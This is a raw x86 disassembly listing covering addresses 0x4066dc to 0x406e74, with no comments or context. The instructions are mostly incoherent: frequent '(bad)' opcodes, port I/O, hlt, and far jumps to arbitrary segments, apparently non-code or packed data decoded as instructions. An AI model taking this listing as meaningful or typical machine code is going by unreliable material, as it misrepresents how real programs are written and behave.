  4066dc:	and    BYTE PTR [esi-0x7c],dh
  4066df:	lods   eax,DWORD PTR ds:[esi]
  4066e0:	and    dl,cl
  4066e2:	dec    edi
  4066e3:	fist   WORD PTR [edx+0x79b2ce01]
  4066e9:	pop    DWORD PTR [eax]
  4066eb:	jle    0x40673e
  4066ed:	das    
  4066ee:	pop    eax
  4066ef:	out    0x5a,al
  4066f1:	shl    eax,1
  4066f3:	cmp    bh,0x33
  4066f6:	or     esi,ebp
  4066f8:	sub    al,0x86
  4066fa:	xor    BYTE PTR [edi-0x79],bh
  4066fd:	lea    esi,[edi+0x47]
  406700:	jp     0x406714
  406702:	retf   
  406703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406704:	fmul   DWORD PTR [ecx+0x5]
  406707:	stos   DWORD PTR es:[edi],eax
  406708:	mov    ebx,0x6d94f424
  40670d:	out    dx,eax
  40670e:	psllq  mm0,QWORD PTR ds:0xeff94d37
  406715:	ret    
  406716:	in     al,dx
  406717:	dec    BYTE PTR [ebx+0x63]
  40671a:	add    BYTE PTR [esi+0x78],ah
  40671d:	push   ebx
  40671e:	les    edi,FWORD PTR [eax]
  406720:	(bad)  
  406721:	dec    ebx
  406722:	sbb    al,0x32
  406724:	test   eax,0xb12d47df
  406729:	mov    bh,0xa6
  40672b:	cs jnp 0x406765
  40672e:	jae    0x406791
  406730:	sbb    edi,DWORD PTR [ebp+0x6c]
  406733:	imul   edx,edx,0x68524624
  406739:	(bad)  
  40673a:	mov    cl,0xac
  40673c:	sub    DWORD PTR [edx+ecx*2-0x5197b560],ebp
  406743:	lods   al,BYTE PTR ds:[esi]
  406744:	jp     0x406751
  406746:	enter  0x1b22,0x98
  40674a:	or     eax,0x276d2897
  40674f:	push   esp
  406750:	jg     0x406792
  406752:	in     eax,0xa7
  406754:	std    
  406755:	mov    eax,ds:0x883fd97e
  40675a:	mov    ah,0xa
  40675c:	add    DWORD PTR [edi+0x28],eax
  40675f:	jbe    0x406716
  406761:	jecxz  0x406765
  406763:	pop    ebp
  406764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406765:	idiv   BYTE PTR gs:[ebp+0x298b5641]
  40676c:	les    ebp,FWORD PTR [edi+0x51]
  40676f:	jae    0x406753
  406771:	jl     0x40679b
  406773:	add    BYTE PTR [edx+0x23],0x8c
  406777:	add    DWORD PTR [ebx+0xa],esi
  40677a:	pop    ecx
  40677b:	mov    dh,0xfb
  40677d:	fcmovnb st,st(6)
  40677f:	aas    
  406780:	dec    esi
  406781:	arpl   WORD PTR [ecx+edx*4+0x6fbdb782],cx
  406788:	sbb    eax,DWORD PTR [ebx+eax*8+0x2cc7d2cb]
  40678f:	push   cs
  406790:	pushf  
  406791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406792:	pop    ss
  406793:	lods   al,BYTE PTR ds:[esi]
  406794:	mov    esp,0xabab66f4
  406799:	jno    0x406729
  40679b:	pop    edi
  40679c:	cmp    al,0x5c
  40679e:	or     al,BYTE PTR [eax-0x5eacb22d]
  4067a4:	pop    edi
  4067a5:	push   esp
  4067a6:	mov    ds:0xec5de0a6,eax
  4067ab:	outs   dx,BYTE PTR ds:[esi]
  4067ac:	inc    ecx
  4067ad:	add    BYTE PTR [esi+0x5b3e1cff],ch
  4067b3:	mov    BYTE PTR [ebx-0x1e],0x3a
  4067b7:	(bad)  
  4067b8:	xor    al,0x44
  4067ba:	dec    edi
  4067bb:	mov    ds:0x53624476,al
  4067c0:	(bad)
  4067c3:	lds    esp,FWORD PTR [ebx]
  4067c5:	dec    esp
  4067c6:	int3   
  4067c7:	pop    ebx
  4067c8:	jmp    0xf678:0xeb619c27
  4067cf:	cmp    DWORD PTR [edi-0xb991922],ebp
  4067d5:	xor    al,0x46
  4067d7:	xchg   edi,eax
  4067d8:	push   edi
  4067d9:	mov    ds:0x90871f07,al
  4067de:	cli    
  4067df:	sbb    eax,0x8e70b755
  4067e4:	(bad)  
  4067e5:	rol    ebp,cl
  4067e7:	(bad)  
  4067e9:	pop    edi
  4067ea:	je     0x40682f
  4067ec:	out    0x51,al
  4067ee:	pop    eax
  4067ef:	and    al,0xac
  4067f1:	jae    0x4067f8
  4067f3:	mov    al,0xbe
  4067f5:	push   0x0
  4067f7:	pop    ebx
  4067f8:	sbb    BYTE PTR [edx-0x53],0x4f
  4067fc:	gs out dx,eax
  4067fe:	add    al,0xb1
  406800:	in     al,0xd1
  406802:	xchg   ebx,eax
  406803:	cs xchg edi,eax
  406805:	adc    al,0x22
  406807:	loopne 0x406855
  406809:	pop    es
  40680a:	cld    
  40680b:	push   0x5a
  40680d:	adc    al,dl
  40680f:	and    eax,0x2d05555e
  406814:	das    
  406815:	mov    ebx,0x1301ab01
  40681a:	xor    al,0x37
  40681c:	shr    bh,cl
  40681e:	xlat   BYTE PTR ds:[ebx]
  40681f:	rol    DWORD PTR [ebp+0x4c7cf1f0],cl
  406825:	fidivr DWORD PTR [eax+0x64e0fb39]
  40682b:	stos   DWORD PTR es:[edi],eax
  40682c:	into   
  40682d:	xchg   ecx,eax
  40682e:	dec    edi
  40682f:	popa   
  406830:	adc    ecx,DWORD PTR [edx-0x6b]
  406833:	aaa    
  406834:	test   eax,0xadffabfe
  406839:	inc    esp
  40683a:	xor    al,0x5c
  40683c:	adc    ebp,edx
  40683e:	neg    DWORD PTR [eax]
  406840:	hlt    
  406841:	enter  0x71e9,0xcb
  406845:	cld    
  406846:	repnz sahf 
  406848:	jbe    0x4067d0
  40684a:	push   cs
  40684b:	sbb    ebp,edi
  40684d:	retf   
  40684e:	xlat   BYTE PTR ds:[ebx]
  40684f:	nop
  406850:	adc    ah,BYTE PTR [ecx+0x33]
  406853:	ret    0x52df
  406856:	ins    BYTE PTR es:[edi],dx
  406857:	mov    edi,0x76f4f560
  40685c:	inc    ebp
  40685d:	fist   DWORD PTR ds:[ebp+0x1601bf61]
  406864:	mov    DWORD PTR [edx-0x3],esp
  406867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406868:	or     al,0xa8
  40686a:	fnstenv [edi-0x4a229836]
  406870:	mov    eax,ds:0x44637339
  406875:	ins    DWORD PTR es:[edi],dx
  406876:	push   0x78664479
  40687b:	push   es
  40687c:	std    
  40687d:	xchg   esi,eax
  40687e:	shr    BYTE PTR [ebp+edx*8-0x2fc8be2e],cl
  406885:	fstp   DWORD PTR [ebx-0x15e0c50e]
  40688b:	cmp    BYTE PTR [edx+edi*1],cl
  40688e:	sub    cl,bh
  406890:	(bad)  
  406891:	push   ss
  406892:	ins    BYTE PTR es:[edi],dx
  406893:	jb     0x4068c1
  406895:	xchg   ecx,eax
  406896:	push   cs
  406897:	push   0x4d
  406899:	add    ebp,DWORD PTR [ebx-0x78]
  40689c:	js     0x406827
  40689e:	xor    esi,eax
  4068a0:	mov    ecx,es
  4068a2:	mov    ?,WORD PTR [esp+esi*8-0x4a]
  4068a6:	fimul  WORD PTR [ecx]
  4068a8:	call   0x5828ddb3
  4068ad:	mov    eax,ds:0xb5455e8e
  4068b2:	out    dx,al
  4068b3:	jmp    0x4068cc
  4068b5:	jae    0x406878
  4068b7:	xchg   BYTE PTR [edx-0x7d],ch
  4068ba:	aas    
  4068bb:	jae    0x4068f3
  4068bd:	mov    ecx,DWORD PTR [ecx]
  4068bf:	mov    eax,0x2928ec21
  4068c4:	mov    ch,0x8b
  4068c6:	dec    eax
  4068c7:	mov    dh,BYTE PTR ds:0x4f617e74
  4068cd:	out    dx,al
  4068ce:	clc    
  4068cf:	mov    ds:0x589779ab,eax
  4068d4:	xor    al,0x14
  4068d6:	ret    
  4068d7:	das    
  4068d8:	std    
  4068d9:	cmp    eax,0x560ca1db
  4068de:	cmp    BYTE PTR [ecx+0x14],dl
  4068e1:	jg     0x406882
  4068e3:	arpl   WORD PTR [eax+edx*8+0x56],ax
  4068e7:	jnp    0x406941
  4068e9:	xchg   ecx,eax
  4068ea:	ins    DWORD PTR es:[edi],dx
  4068eb:	pop    ebx
  4068ec:	push   cs
  4068ed:	mov    eax,0x9572a1d7
  4068f2:	fldcw  WORD PTR [eax-0x73b086ea]
  4068f8:	sub    DWORD PTR [edi+0x689448ab],ecx
  4068fe:	mov    dl,0xb5
  406900:	int3   
  406901:	jge    0x406933
  406903:	fadd   st,st(6)
  406905:	jb     0x4068fc
  406907:	pop    edx
  406908:	inc    eax
  406909:	cmc    
  40690a:	or     al,0x35
  40690c:	adc    BYTE PTR [eax-0x6d],0x66
  406910:	sub    ch,BYTE PTR gs:[edx]
  406913:	push   ebp
  406914:	cmp    BYTE PTR [edx+0x4df1f8ac],dh
  40691a:	inc    esp
  40691b:	(bad)  [ebx-0x3e]
  40691e:	sub    al,0x1c
  406920:	imul   ebp,DWORD PTR [edx+eiz*8-0x57],0x55e1a210
  406928:	sbb    dh,ch
  40692a:	shr    BYTE PTR [ebx],1
  40692c:	fstp   TBYTE PTR [esi]
  40692e:	cdq    
  40692f:	(bad)  
  406930:	dec    ebp
  406931:	and    ebx,0xffffff99
  406934:	js     0x4068bc
  406936:	xlat   BYTE PTR ds:[ebx]
  406937:	(bad)  [ebx-0x6d]
  40693a:	test   BYTE PTR [ebx+0x54],ch
  40693d:	xchg   ebx,eax
  40693e:	xor    bh,BYTE PTR [edx]
  406940:	in     eax,0x97
  406942:	aam    0x4b
  406944:	pop    edi
  406945:	xchg   BYTE PTR gs:[esi],dh
  406948:	aaa    
  406949:	outs   dx,BYTE PTR ds:[esi]
  40694a:	xor    al,0x11
  40694c:	xchg   edi,eax
  40694d:	int3   
  40694e:	and    ecx,DWORD PTR [edx+edx*1+0x6b]
  406952:	lahf   
  406953:	lock pop ebp
  406955:	jbe    0x406983
  406957:	or     bl,BYTE PTR [edi]
  406959:	lods   eax,DWORD PTR ds:[esi]
  40695a:	(bad)  
  40695b:	stc    
  40695c:	sbb    DWORD PTR [esi-0x26e35e92],0xa9641571
  406966:	mov    ebp,0xb664965
  40696b:	aas    
  40696c:	enter  0xf309,0x9c
  406970:	xchg   edi,eax
  406971:	dec    esi
  406972:	(bad)  
  406973:	fistp  QWORD PTR [ebx+0x52201d5a]
  406979:	outs   dx,BYTE PTR ds:[esi]
  40697a:	data16 mov ah,0x28
  40697d:	mov    ds:0xe5822ef0,al
  406982:	pop    esi
  406983:	repnz dec esi
  406985:	mov    eax,ds:0x18c0b8a4
  40698a:	cs je  0x406942
  40698d:	les    ecx,FWORD PTR [esi]
  40698f:	jae    0x4069cf
  406991:	sub    BYTE PTR [edi],bl
  406993:	scas   eax,DWORD PTR es:[edi]
  406994:	dec    eax
  406995:	mov    edx,gs
  406997:	aas    
  406998:	push   esp
  406999:	call   0xfa09:0x1ddcafbc
  4069a0:	add    al,0xc1
  4069a2:	xchg   ebp,eax
  4069a3:	and    DWORD PTR [ebx],ebp
  4069a5:	jl     0x4069fa
  4069a7:	xchg   esp,eax
  4069a8:	and    DWORD PTR [eax+0x77],edx
  4069ab:	ret    
  4069ac:	xor    al,0x5e
  4069ae:	cmp    cl,BYTE PTR [edi+0x2893c0ef]
  4069b4:	xchg   ebp,eax
  4069b5:	adc    al,0x5c
  4069b7:	jbe    0x4069f0
  4069b9:	and    ebx,ecx
  4069bb:	add    dh,ah
  4069bd:	pop    ecx
  4069be:	jl     0x4069d9
  4069c0:	jb     0x406966
  4069c2:	lds    edi,FWORD PTR [edx+ebx*8]
  4069c5:	loope  0x406973
  4069c7:	fld    QWORD PTR [ecx]
  4069c9:	dec    ebx
  4069ca:	adc    BYTE PTR [ecx+0xe],cl
  4069cd:	fwait
  4069ce:	adc    eax,0x36d228ea
  4069d3:	stos   BYTE PTR es:[edi],al
  4069d4:	popa   
  4069d5:	mov    DWORD PTR [ecx+0x3b],ebx
  4069d8:	call   0xfc13269b
  4069dd:	out    dx,eax
  4069de:	xor    ch,BYTE PTR [edi-0x21]
  4069e1:	add    eax,0x5c3c4368
  4069e6:	dec    esi
  4069e7:	mov    ch,0x71
  4069e9:	je     0x171f56f4
  4069ef:	sub    bh,BYTE PTR [edi-0x19]
  4069f2:	arpl   WORD PTR [ebx],dx
  4069f4:	xchg   esp,eax
  4069f5:	jnp    0x406a23
  4069f7:	sbb    bh,BYTE PTR [esi+ecx*1]
  4069fa:	pop    ds
  4069fb:	pop    eax
  4069fc:	push   cs
  4069fd:	lods   al,BYTE PTR ds:[esi]
  4069fe:	mov    cl,0xe5
  406a00:	dec    ebp
  406a01:	out    dx,al
  406a02:	rol    DWORD PTR [ebp-0x55],0xc3
  406a06:	ins    BYTE PTR es:[edi],dx
  406a07:	fist   DWORD PTR [edi]
  406a09:	jo     0x406a0b
  406a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a0c:	pop    ebx
  406a0d:	in     al,0x89
  406a0f:	mov    ah,0x18
  406a11:	pop    ebp
  406a12:	mov    dl,0x14
  406a14:	call   0x6bfb97f5
  406a19:	pop    ebp
  406a1a:	inc    ebp
  406a1b:	jnp    0x4069ef
  406a1d:	(bad)  
  406a1e:	cmp    eax,eax
  406a20:	scas   eax,DWORD PTR es:[edi]
  406a21:	mov    DWORD PTR [ebp-0x221bd289],esp
  406a27:	adc    BYTE PTR [esi+0x21601818],cl
  406a2d:	pusha  
  406a2e:	sub    DWORD PTR [edi],0xf871ed5a
  406a34:	jge    0x406a5a
  406a36:	stc    
  406a37:	dec    esi
  406a38:	les    eax,FWORD PTR [ecx]
  406a3a:	mov    ebp,0x8d133b0a
  406a3f:	mov    ebx,DWORD PTR [ebp-0x62]
  406a42:	add    eax,0xab2d73e9
  406a47:	dec    esi
  406a48:	repz push 0x38
  406a4b:	les    edx,FWORD PTR [eax]
  406a4d:	cmc    
  406a4e:	shl    DWORD PTR [ebp+0x16],1
  406a51:	xor    bl,BYTE PTR [ebp+0x3345165]
  406a57:	mov    esi,0x1dc7fff5
  406a5c:	fisub  DWORD PTR [ecx+0x5e7b71c4]
  406a62:	rep stos DWORD PTR es:[edi],eax
  406a64:	mov    ds,WORD PTR [esi+0x61]
  406a67:	arpl   WORD PTR [eax+edx*2-0x287e2620],bp
  406a6e:	sub    al,0x72
  406a70:	test   cl,dh
  406a72:	cs ins BYTE PTR es:[edi],dx
  406a74:	js     0x406a5c
  406a76:	inc    edi
  406a77:	mov    ah,0x21
  406a79:	aam    0x7d
  406a7b:	push   0x0
  406a7d:	popf   
  406a7e:	hlt    
  406a7f:	into   
  406a80:	sub    BYTE PTR [eax],0xa3
  406a83:	or     eax,ebp
  406a85:	dec    ebx
  406a86:	pop    eax
  406a87:	jmp    0x406a0b
  406a89:	hlt    
  406a8a:	adc    al,0x1d
  406a8c:	sub    ebx,esi
  406a8e:	lock shr BYTE PTR [ebx+0x6a],cl
  406a92:	nop
  406a93:	(bad)  
  406a94:	dec    ecx
  406a95:	pushf  
  406a96:	xchg   ebx,eax
  406a97:	mov    WORD PTR [edi],?
  406a99:	jbe    0x406a85
  406a9b:	xor    eax,DWORD PTR [esi]
  406a9d:	mov    ah,BYTE PTR [eax+0x73]
  406aa0:	mov    dl,cl
  406aa2:	fimul  WORD PTR [esi-0x36]
  406aa5:	sub    BYTE PTR [ecx],ch
  406aa7:	imul   ebx,DWORD PTR [eax-0x51],0x409818ec
  406aae:	add    edi,DWORD PTR [edx-0x28]
  406ab1:	xor    DWORD PTR [eax-0x2c],ebx
  406ab4:	in     eax,0x19
  406ab6:	push   ds
  406ab7:	les    ecx,FWORD PTR [ebp+0x467a36b6]
  406abd:	(bad)  
  406abe:	ins    BYTE PTR es:[edi],dx
  406abf:	in     al,dx
  406ac0:	stos   DWORD PTR es:[edi],eax
  406ac1:	mov    dh,0xce
  406ac3:	jp     0x406af7
  406ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ac6:	cwde   
  406ac7:	jnp    0x406a90
  406ac9:	outs   dx,DWORD PTR ds:[esi]
  406aca:	sbb    DWORD PTR [esi-0x58df3e8e],edx
  406ad0:	mov    cl,0xed
  406ad2:	(bad)  
  406ad3:	hlt    
  406ad4:	mov    ebx,DWORD PTR [esi]
  406ad6:	je     0x406a87
  406ad8:	aaa    
  406ad9:	cwde   
  406ada:	aam    0x25
  406adc:	pop    eax
  406add:	rol    BYTE PTR [edi],cl
  406adf:	cmp    BYTE PTR [ebp+0x6885e34c],0x2
  406ae6:	call   0xb642:0x8339b45a
  406aed:	cdq    
  406aee:	int    0x9c
  406af0:	mov    al,0xa0
  406af2:	ror    eax,0xd8
  406af5:	iret   
  406af6:	fwait
  406af7:	icebp  
  406af8:	in     al,0x51
  406afa:	xor    al,0x5c
  406afc:	ret    
  406afd:	push   0xbe19c2bc
  406b02:	ret    
  406b03:	xchg   ebp,eax
  406b04:	dec    edi
  406b05:	ja     0x406ac8
  406b07:	adc    eax,0xfa9b6b7b
  406b0c:	and    BYTE PTR [edi],dl
  406b0e:	ret    0xa6c3
  406b11:	xchg   esp,eax
  406b12:	fld    QWORD PTR [ebx]
  406b14:	push   esp
  406b15:	cwde   
  406b16:	push   edi
  406b17:	add    al,0x7a
  406b19:	adc    al,0xbe
  406b1b:	cmp    DWORD PTR [esi],eax
  406b1d:	mov    cl,0x70
  406b1f:	mul    DWORD PTR [eax]
  406b21:	adc    ebp,0x6d8a3a8e
  406b27:	inc    ebx
  406b28:	aaa    
  406b29:	pop    es
  406b2a:	int3   
  406b2b:	mov    esp,0xf4ddc86e
  406b30:	xchg   esi,eax
  406b31:	dec    eax
  406b32:	cs fwait
  406b34:	dec    edi
  406b35:	neg    cl
  406b37:	xchg   ecx,eax
  406b38:	push   0x6cc11ef9
  406b3d:	and    eax,0x2bb043da
  406b42:	iret   
  406b43:	(bad)  
  406b44:	fiadd  DWORD PTR [eax+0x5664c4fd]
  406b4a:	push   0xffffffd5
  406b4c:	mov    esp,0x9bb8e956
  406b51:	and    eax,0x5a060aea
  406b56:	dec    ebx
  406b57:	in     al,dx
  406b58:	int3   
  406b59:	xchg   edi,eax
  406b5a:	fs jge 0x406afe
  406b5d:	cmc    
  406b5e:	out    dx,al
  406b5f:	call   0xa599b217
  406b64:	cmp    dl,bl
  406b66:	push   cs
  406b67:	mov    esp,0x4a27c60a
  406b6c:	icebp  
  406b6d:	jb     0x406be3
  406b6f:	mov    bl,0xff
  406b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b72:	mov    WORD PTR [esi-0x124fe880],cs
  406b78:	and    eax,DWORD PTR [ebp+0x3]
  406b7b:	and    BYTE PTR [edi-0x6f],bh
  406b7e:	mov    eax,ds:0x4a1f2cc8
  406b83:	pop    edx
  406b84:	and    BYTE PTR [ecx+eax*8],al
  406b87:	xchg   BYTE PTR [eax+0x1041db12],dl
  406b8d:	lock sub edx,DWORD PTR [esi]
  406b90:	jge    0x406b40
  406b92:	cmc    
  406b93:	mov    ds:0x5eeaf8b7,eax
  406b98:	jae    0x406c04
  406b9a:	push   esp
  406b9b:	lock out dx,al
  406b9d:	js     0x406bb1
  406b9f:	and    esi,esp
  406ba1:	(bad)  
  406ba3:	(bad)  
  406ba4:	jmp    0x406be1
  406ba6:	add    esp,DWORD PTR [eax-0x121defae]
  406bac:	std    
  406bad:	cdq    
  406bae:	int3   
  406baf:	jmp    0xa6b3:0x2b5814fb
  406bb6:	hlt    
  406bb7:	cwde   
  406bb8:	popf   
  406bb9:	adc    bh,dh
  406bbb:	mov    al,ds:0x8c74072d
  406bc0:	sub    BYTE PTR [edx+eax*2+0x50],0x4
  406bc5:	pop    ebx
  406bc6:	inc    ebp
  406bc7:	iret   
  406bc8:	imul   ebp,ecx,0x8d770316
  406bce:	inc    eax
  406bcf:	xlat   BYTE PTR ds:[ebx]
  406bd0:	and    edx,DWORD PTR [edi]
  406bd2:	test   dh,al
  406bd4:	sub    al,0x56
  406bd6:	fild   QWORD PTR [esi-0x736c20a2]
  406bdc:	out    0xb3,al
  406bde:	or     al,0x8e
  406be0:	pop    es
  406be1:	in     eax,dx
  406be2:	mov    ?,WORD PTR [ecx]
  406be4:	cdq    
  406be5:	push   ebx
  406be6:	sub    BYTE PTR [edi-0x5cec52fe],bl
  406bec:	inc    esi
  406bed:	xor    BYTE PTR [edx],0x7d
  406bf0:	jno    0x406b7a
  406bf2:	pop    edi
  406bf3:	sahf   
  406bf4:	and    esi,DWORD PTR [ebx+0x6541d038]
  406bfa:	sbb    al,BYTE PTR [eax]
  406bfc:	lods   al,BYTE PTR ds:[esi]
  406bfd:	and    BYTE PTR [edx-0x1d],dh
  406c00:	ret    
  406c01:	hlt    
  406c02:	stos   BYTE PTR es:[edi],al
  406c03:	data16 jo 0x406bbc
  406c06:	push   ss
  406c07:	mov    DWORD PTR [eax],ebp
  406c09:	ds jmp 0x7061:0x51b4008a
  406c11:	sub    eax,0xd85cdfcb
  406c16:	mov    ebx,0x44ae3371
  406c1b:	mov    bh,0xaf
  406c1d:	mov    ds:0x1d54eddb,al
  406c22:	push   eax
  406c23:	sbb    esp,DWORD PTR [ecx+0x1e]
  406c26:	adc    eax,0x24c67525
  406c2b:	sti    
  406c2c:	and    BYTE PTR [ebx+ebp*4],al
  406c2f:	lods   al,BYTE PTR ds:[esi]
  406c30:	seto   BYTE PTR [ecx-0x39]
  406c34:	pop    ebx
  406c35:	mov    bh,0x59
  406c37:	retf   0xbc8a
  406c3a:	jg     0x406c01
  406c3c:	inc    ecx
  406c3d:	stos   BYTE PTR es:[edi],al
  406c3e:	loop   0x406c79
  406c40:	or     edx,esp
  406c42:	xor    eax,0xcc73935e
  406c47:	aas    
  406c48:	mov    eax,0xfea73ef0
  406c4d:	jmp    0x83b6:0x8ea0ecfd
  406c54:	sbb    BYTE PTR [ecx-0x47],0x8c
  406c58:	retf   0xf909
  406c5b:	aad    0x57
  406c5d:	inc    esp
  406c5e:	out    dx,al
  406c5f:	ds in  al,0x8d
  406c62:	call   0xc1be:0xfe86725b
  406c69:	jmp    0x28fb271d
  406c6e:	enter  0x2a98,0xef
  406c72:	sub    edi,eax
  406c74:	push   ss
  406c75:	sti    
  406c76:	(bad)  
  406c77:	hlt    
  406c78:	add    bl,BYTE PTR [ecx-0x588f808e]
  406c7e:	mov    esi,0x2946ea98
  406c83:	push   edx
  406c84:	jmp    0x406d01
  406c86:	shl    BYTE PTR [eax-0x49],1
  406c89:	mov    esi,0x3f8af7bc
  406c8e:	cdq    
  406c8f:	lahf   
  406c90:	lods   eax,DWORD PTR ds:[esi]
  406c91:	jmp    0x406cd0
  406c93:	sub    bh,BYTE PTR [ebp+ebx*2+0x76]
  406c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c98:	aam    0x81
  406c9a:	pop    ebx
  406c9b:	xchg   esi,eax
  406c9c:	aad    0x81
  406c9e:	inc    edi
  406c9f:	(bad)  [ebx]
  406ca1:	mov    bh,0xfd
  406ca3:	stos   DWORD PTR es:[edi],eax
  406ca4:	jno    0x406d24
  406ca6:	retf   0xf33d
  406ca9:	or     DWORD PTR [edi-0x75],esp
  406cac:	cdq    
  406cad:	xor    DWORD PTR [ecx-0x64],edi
  406cb0:	daa    
  406cb1:	dec    edi
  406cb2:	adc    al,0x65
  406cb4:	xor    DWORD PTR [esi],ebx
  406cb6:	call   0x6d2a:0x472f6efb
  406cbd:	mov    edi,0x9127458f
  406cc2:	ffree  st(6)
  406cc4:	popa   
  406cc5:	fdivr  st(5),st
  406cc7:	int3   
  406cc8:	and    al,0xe9
  406cca:	jge    0x406c9a
  406ccc:	into   
  406ccd:	mov    eax,ds:0x123aaca8
  406cd2:	mov    ds:0xf245042e,al
  406cd7:	test   ebp,ecx
  406cd9:	cmp    BYTE PTR [ebp+ecx*4+0x5],al
  406cdd:	jbe    0x406d38
  406cdf:	pusha  
  406ce0:	imul   edi,DWORD PTR [eax-0x14],0x246acb02
  406ce7:	mov    ebp,esi
  406ce9:	pop    eax
  406cea:	xchg   edi,eax
  406ceb:	pop    esi
  406cec:	stos   DWORD PTR es:[edi],eax
  406ced:	cmp    eax,0x1fa992ed
  406cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf3:	enter  0xf8c6,0x2b
  406cf7:	pop    ss
  406cf8:	push   edx
  406cf9:	pop    ebx
  406cfa:	push   0xffffffd7
  406cfc:	int    0x73
  406cfe:	and    cl,BYTE PTR [eax]
  406d00:	ret    0x4086
  406d03:	fadd   QWORD PTR [ebp-0x29]
  406d06:	jg     0x406d3e
  406d08:	pop    eax
  406d09:	in     eax,dx
  406d0a:	retf   0x4dc1
  406d0d:	shr    BYTE PTR ss:[edx-0x5694f30c],0xdf
  406d15:	push   ebx
  406d16:	rcl    DWORD PTR [ecx-0x58b0b3d],cl
  406d1c:	push   esi
  406d1d:	adc    edi,edi
  406d1f:	adc    dl,BYTE PTR [edi]
  406d21:	or     esp,DWORD PTR [esp+ebp*1-0x41]
  406d25:	sub    cl,BYTE PTR [esi+0x76a3bda3]
  406d2b:	inc    edi
  406d2c:	fwait
  406d2d:	mov    edi,0x8958c954
  406d32:	in     al,0x2
  406d34:	icebp  
  406d35:	retf   0x27de
  406d38:	xchg   BYTE PTR [eax],ch
  406d3a:	and    eax,0xeb19c772
  406d3f:	mov    eax,ds:0xa3cace05
  406d44:	jo     0x406d8e
  406d46:	fld    TBYTE PTR [edx-0x71c89225]
  406d4c:	mov    edi,0xad422a30
  406d51:	(bad)  
  406d52:	into   
  406d53:	jmp    0x5a2fc587
  406d58:	cld    
  406d59:	push   ebp
  406d5a:	push   ecx
  406d5b:	jecxz  0x406d19
  406d5d:	es sbb al,0xa4
  406d60:	xchg   edx,eax
  406d61:	xchg   BYTE PTR [eax+0x33],ah
  406d64:	xor    eax,0x223bae93
  406d69:	or     edi,DWORD PTR [edx+0x67280ff7]
  406d6f:	dec    ebp
  406d70:	out    dx,al
  406d71:	std    
  406d72:	sbb    dh,BYTE PTR [ebx]
  406d74:	mov    ah,0xcf
  406d76:	popf   
  406d77:	jmp    0xa351:0xbb98e166
  406d7e:	mov    dh,BYTE PTR [ebx+0x524449c5]
  406d84:	in     al,0x41
  406d86:	mov    bl,0x55
  406d88:	jb     0x406ddc
  406d8a:	xchg   BYTE PTR [ecx-0x10],ch
  406d8d:	xor    DWORD PTR [eax-0x253bb67d],esi
  406d93:	dec    eax
  406d94:	adc    ebx,DWORD PTR [esi+0x4]
  406d97:	lahf   
  406d98:	test   al,0xdf
  406d9a:	xchg   DWORD PTR [ebx-0x76],edi
  406d9d:	pop    eax
  406d9e:	pop    es
  406d9f:	pusha  
  406da0:	mov    edi,DWORD PTR [eax]
  406da2:	cld    
  406da3:	dec    eax
  406da4:	cmp    bl,BYTE PTR [edi]
  406da6:	mov    DWORD PTR [esi+eiz*4-0x537e5bc9],0x33859ed0
  406db1:	cmp    DWORD PTR [ebx+0x5a7370ab],edi
  406db7:	sbb    eax,DWORD PTR [eax-0x2ca75a9]
  406dbd:	jp     0x406d94
  406dbf:	cmp    DWORD PTR [edx],esp
  406dc1:	and    eax,0xae48e0c0
  406dc6:	(bad)  
  406dc7:	mov    dh,0x9f
  406dc9:	mov    ds:0xeb27518b,eax
  406dce:	mov    bh,0x1e
  406dd0:	fisub  DWORD PTR [edx-0x7]
  406dd3:	xor    eax,0xd193e90b
  406dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd9:	int3   
  406dda:	or     al,BYTE PTR [esi+0x6a]
  406ddd:	or     ebp,DWORD PTR [edx-0x1420f4a7]
  406de3:	mov    ds:0xd3ab21d,al
  406de8:	push   ebx
  406de9:	popa   
  406dea:	sahf   
  406deb:	cwde   
  406dec:	mov    edx,DWORD PTR [edx]
  406dee:	jge    0x406e46
  406df0:	test   al,0xa3
  406df2:	fisub  DWORD PTR [ebx+0x3270c53b]
  406df8:	pop    ecx
  406df9:	inc    ecx
  406dfa:	push   ebx
  406dfb:	sbb    al,0xfc
  406dfd:	ins    DWORD PTR es:[edi],dx
  406dfe:	jl     0x406da1
  406e00:	xor    al,0xce
  406e02:	(bad)  
  406e04:	inc    edx
  406e05:	sbb    bh,cl
  406e07:	ret    0xa60b
  406e0a:	add    al,0xb5
  406e0c:	mov    edx,0x17a160d4
  406e11:	push   ebp
  406e12:	jae    0x406ddf
  406e14:	mov    dh,0x70
  406e16:	int    0xb0
  406e18:	mov    cl,BYTE PTR [edi+0x5b]
  406e1b:	xchg   ecx,eax
  406e1c:	inc    edi
  406e1d:	xchg   ebp,eax
  406e1e:	sub    BYTE PTR [edx+0x627dddd4],al
  406e24:	add    cl,BYTE PTR [ecx-0x10cfa4e7]
  406e2a:	jmp    0xb060926a
  406e2f:	out    0x63,eax
  406e31:	fwait
  406e32:	inc    ecx
  406e33:	jle    0x406e53
  406e35:	mov    ds:0x45d95f41,al
  406e3a:	jno    0x406df2
  406e3c:	cmp    dh,dh
  406e3e:	push   ebp
  406e3f:	int    0x84
  406e41:	retf   0x781a
  406e44:	dec    ebx
  406e45:	mov    ch,0x79
  406e47:	scas   eax,DWORD PTR es:[edi]
  406e48:	and    ebx,DWORD PTR [edx]
  406e4a:	mov    ah,0x92
  406e4c:	xor    edi,DWORD PTR [di+0x2d]
  406e50:	or     eax,0x75f19f99
  406e55:	fwait
  406e56:	dec    ecx
  406e57:	mov    eax,ds:0x2f93e4af
  406e5c:	inc    edi
  406e5d:	lahf   
  406e5e:	or     al,0x3b
  406e60:	cli    
  406e61:	jbe    0x406e41
  406e63:	sbb    eax,0x99d0199d
  406e68:	scas   al,BYTE PTR es:[edi]
  406e69:	imul   ecx,esi,0x1a
  406e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e6d:	retf   
  406e6e:	ss sbb edi,ecx
  406e71:	daa    
  406e72:	mov    ah,0xb2
  406e74:	sti    
